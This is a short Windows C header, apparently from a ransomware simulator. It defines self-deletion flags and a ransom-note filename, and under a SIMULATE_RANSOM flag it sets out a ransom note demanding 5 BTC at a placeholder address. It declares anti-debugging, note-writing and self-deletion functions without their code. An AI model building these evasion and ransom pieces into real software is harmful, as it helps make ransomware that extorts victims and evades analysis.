#ifndef ANTIANALYSIS_H
#define ANTIANALYSIS_H

#include <windows.h>

#define FILE_DISPOSITION_DELETE				0x00000001
#define FILE_DISPOSITION_POSIX_SEMANTICS	0x00000002
#define RANSOM_NOTE_FILENAME				L"\\READ_ME_NOW.txt"

#ifdef SIMULATE_RANSOM

#define RANSOM_NOTE \
  "Uh oh... you have been found GUILTY of being a noob!\r\n"  \
  "As punishment, we have taken your files hostage.\r\n" \
  "This data can be restored, but only after you pay\r\n"  \
  "your debt to society. Send 5.0 BTC to the address below:\r\n"    \
  "1MockBTCAddrxxxxxxxxxxxxxxxxxx\r\n"    
  
#endif // SIMULATE_RANSOM

BOOL __cdecl IsBeingDebugged(void);
BOOL WriteTextFile(LPCSTR wNote);
BOOL DeleteSelfFromDisk(void);

#endif // ANTIANALYSIS_H